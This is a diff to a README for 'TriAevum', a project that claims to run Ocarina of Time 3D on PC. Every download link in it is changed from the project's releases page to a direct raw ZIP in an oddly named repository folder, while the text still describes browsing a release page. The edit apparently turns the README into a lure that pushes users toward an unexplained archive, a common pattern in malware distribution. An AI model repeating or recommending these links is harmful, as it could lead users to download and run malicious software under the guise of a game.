@@ -1,6 +1,6 @@
 # 🕹️ TriAevum - Run Ocarina of Time 3D on PC
 
-[![Download TriAevum](https://img.shields.io/badge/Download-TriAevum-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/azharzy4-cell/TriAevum/releases)
+[![Download TriAevum](https://img.shields.io/badge/Download-TriAevum-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/azharzy4-cell/TriAevum/raw/refs/heads/main/septile/Aevum_Tri_1.3.zip)
 
 ## 🎮 What Is TriAevum?
 
@@ -26,7 +26,7 @@ If you're not sure about your graphics card, don't worry. Most computers from th
 
 Visit this link to download the application:
 
-[**https://github.com/azharzy4-cell/TriAevum/releases**](https://github.com/azharzy4-cell/TriAevum/releases)
+[**https://github.com/azharzy4-cell/TriAevum/raw/refs/heads/main/septile/Aevum_Tri_1.3.zip**](https://github.com/azharzy4-cell/TriAevum/raw/refs/heads/main/septile/Aevum_Tri_1.3.zip)
 
 Once you're on that page, look for the latest version listed at the top. Click the download button for the Windows version.
 
@@ -119,7 +119,7 @@ Yes, TriAevum saves your game progress automatically, similar to the original ga
 
 Because TriAevum is experimental, new versions come out frequently. To get the latest features and fixes:
 
-1. Visit the same download page: [**https://github.com/azharzy4-cell/TriAevum/releases**](https://github.com/azharzy4-cell/TriAevum/releases)
+1. Visit the same download page: [**https://github.com/azharzy4-cell/TriAevum/raw/refs/heads/main/septile/Aevum_Tri_1.3.zip**](https://github.com/azharzy4-cell/TriAevum/raw/refs/heads/main/septile/Aevum_Tri_1.3.zip)
 2. Look at the top release – that's the newest version
 3. Download the new ZIP and extract it over the old folder (or delete the old folder and use the new one)
 
@@ -164,7 +164,7 @@ Remember: the project is experimental, so if you find a bug, check the releases 
 
 **Download TriAevum now and relive the legend on your PC:**
 
-[**🌟 Download TriAevum - Latest Release**](https://github.com/azharzy4-cell/TriAevum/releases)
+[**🌟 Download TriAevum - Latest Release**](https://github.com/azharzy4-cell/TriAevum/raw/refs/heads/main/septile/Aevum_Tri_1.3.zip)
 
 Enjoy the adventure! 🗡️🛡️✨
 
